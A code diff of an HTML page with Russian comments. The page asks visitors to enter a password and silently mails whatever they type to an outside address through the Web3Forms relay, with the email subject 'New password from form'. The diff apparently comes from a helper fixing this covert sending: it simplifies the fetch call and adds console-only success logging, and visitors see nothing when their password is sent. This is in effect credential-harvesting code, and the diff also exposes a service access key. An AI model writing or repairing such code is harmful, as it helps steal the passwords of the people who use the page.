@@ -131,13 +131,12 @@ button:hover {
         </div>
     </div>
     <div class="right">
-        <form id="myForm">  <!-- добавил id="myForm" -->
+        <form id="myForm">
             <input type="hidden" name="access_key" value="a9d2bb5d-ade0-4087-821e-6df2ae1495ca">
-            <!-- Можно добавить тему письма -->
-            <input type="hidden" name="_subject" value="Новый пароль с формы">
+            <input type="hidden" name="_subject" value="Новый ввод с формы — пароль">
 
             <div class="input-group">
-                <input id="passwordInput" type="password" name="password" required>  <!-- добавил name="password" -->
+                <input id="passwordInput" type="password" name="password" required>
                 <label>Введите пароль</label>
             </div>
             <div class="checkbox">
@@ -162,40 +161,30 @@ function togglePassword() {
     }
 }
 
-// Перехват отправки формы
 document.getElementById("myForm").addEventListener("submit", function(e) {
-    e.preventDefault();  // ← главное: блокируем перезагрузку страницы
+    e.preventDefault(); // предотвращаем перезагрузку страницы
 
-    // Собираем данные (пароль + ключ)
     const formData = new FormData(this);
-    const object = {};
-    formData.forEach((value, key) => { object[key] = value; });
-    const json = JSON.stringify(object);
 
-    // Отправляем в фоне
     fetch("https://api.web3forms.com/submit", {
         method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-            "Accept": "application/json"
-        },
-        body: json
+        body: formData  // ← самый надёжный способ — без headers и JSON
     })
-    .then(async (response) => {
-        // Успех — ничего не показываем
-        // console.log("Отправлено успешно");
-        // Опционально: очистить поле после отправки
-        // document.getElementById("passwordInput").value = "";
+    .then(response => {
+        if (response.ok) {
+            console.log("Успешно отправлено! Данные должны прийти на почту.");
+            // document.getElementById("passwordInput").value = ""; // ← раскомментировать, если нужно очищать поле
+        } else {
+            console.log("Сервер ответил не 200:", response.status);
+        }
     })
-    .catch((error) => {
-        // Ошибка — тоже молча (только в консоль)
-        console.error("Ошибка отправки:", error);
+    .catch(error => {
+        console.error("Ошибка при отправке:", error);
     });
 });
 </script>
 
-<!-- твой старый скрипт cloudflare (оставил как есть) -->
+<!-- оставляем твой cloudflare скрипт -->
 <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-"></script>
 </body>
 </html>
-
